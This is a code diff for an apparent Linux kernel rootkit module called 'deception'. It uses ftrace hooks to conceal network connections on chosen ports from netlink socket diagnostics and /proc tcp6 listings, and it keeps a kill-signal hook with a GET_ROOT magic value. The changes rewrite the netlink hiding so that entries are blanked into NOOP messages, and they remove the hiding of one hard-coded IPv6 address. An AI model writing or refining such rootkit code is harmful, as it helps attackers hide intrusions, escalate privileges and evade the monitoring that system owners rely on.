@@ -20,13 +20,11 @@
 #include <linux/in.h>
 #include <net/sock.h>
 #include <linux/kmod.h>
-#include <linux/inet.h>   // Required for in6_pton
+#include <linux/inet.h>
 #include <net/ipv6.h>
 
 #include "ftrace_helper.h"
 
-static struct in6_addr target_ip6;
-#define IP6_ADDRESS_TO_HIDE "2601:603:a7c:71c0:baba:19db:8655:2938"
 #define MOD_REVEAL 8000
 #define GET_ROOT 31337
 
@@ -273,38 +271,44 @@ asmlinkage long hook_recvmsg(const struct pt_regs *regs)
         return ret;
     }
 
-    while (offset + sizeof(struct nlmsghdr) <= ret) {
+    while (offset + NLMSG_HDRLEN <= ret) {
+        long rem = ret - offset;
         nlh = (struct nlmsghdr *)(kbuf + offset);
-        bool hide = false;
 
-        if (nlh->nlmsg_len < sizeof(struct nlmsghdr))
+        if (!NLMSG_OK(nlh, rem))
             break;
 
+        if (nlh->nlmsg_type == NLMSG_DONE || nlh->nlmsg_type == NLMSG_ERROR) {
+            offset += NLMSG_ALIGN(nlh->nlmsg_len);
+            continue;
+        }
+
         if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
-            nlh->nlmsg_len >= sizeof(struct nlmsghdr) +
-                              sizeof(struct inet_diag_msg)) {
-            struct inet_diag_msg *diag =
-                (struct inet_diag_msg *)(nlh + 1);
+            nlh->nlmsg_len >= NLMSG_LENGTH(sizeof(struct inet_diag_msg))) {
+
+            struct inet_diag_msg *diag = (struct inet_diag_msg *)NLMSG_DATA(nlh);
+            bool hide = false;
 
             if (is_port_hidden(ntohs(diag->id.idiag_sport)) ||
-                is_port_hidden(ntohs(diag->id.idiag_dport)))
+                is_port_hidden(ntohs(diag->id.idiag_dport))) {
                 hide = true;
+            }
+
+            if (hide) {
+                size_t msg_len = NLMSG_ALIGN(nlh->nlmsg_len);
+                
+                /* Overwrite the entire netlink entry payload with zeroes */
+                memset(NLMSG_DATA(nlh), 0, msg_len - NLMSG_HDRLEN);
+                
+                /* Turn the header into a NOOP so the ss parser skips it safely */
+                nlh->nlmsg_type = NLMSG_NOOP;
+            }
         }
 
-        if (hide) {
-            long reclen = nlh->nlmsg_len;
-            long tail   = ret - (offset + reclen);
-
-            if (tail > 0)
-                memmove(kbuf + offset,
-                        kbuf + offset + reclen,
-                        tail);
-            ret -= reclen;
-        } else {
-            offset += nlh->nlmsg_len;
-        }
+        offset += NLMSG_ALIGN(nlh->nlmsg_len);
     }
 
+    /* Copy back the exact total length (ret) to prevent truncation errors */
     copy_to_user(iov_base, kbuf, ret);
     kvfree(kbuf);
     return ret;
@@ -443,16 +447,7 @@ asmlinkage long hook_kill(const struct pt_regs *regs)
 
 static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
 {
-    if (v != SEQ_START_TOKEN && v != NULL) {
-        struct sock *sk = (struct sock *)v;
-
-        /* Hide specific IPv6 address */
-        if (sk->sk_family == AF_INET6) {
-            if (ipv6_addr_equal(&sk->sk_v6_daddr, &target_ip6) ||
-                ipv6_addr_equal(&sk->sk_v6_rcv_saddr, &target_ip6))
-                return 0;
-        }
-    }
+    /* IPv6 address hiding removed */
 
     if (v != SEQ_START_TOKEN && v != NULL && hidden_ports_count > 0) {
         struct sock *sk = (struct sock *)v;
@@ -493,10 +488,7 @@ static int __init deception_init(void)
     my_vmap_area_lock = (spinlock_t *)lookup_name("vmap_area_lock");
     my_vmap_area_root = (struct rb_root *)lookup_name("vmap_area_root");
 
-    if (in6_pton(IP6_ADDRESS_TO_HIDE, -1,
-                 target_ip6.s6_addr, -1, NULL) != 1) {
-        printk(KERN_ERR "deception: Failed to parse IPv6 address\n");
-    }
+    /* IPv6 address parsing removed */
 
     err = fh_install_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
     if (err)
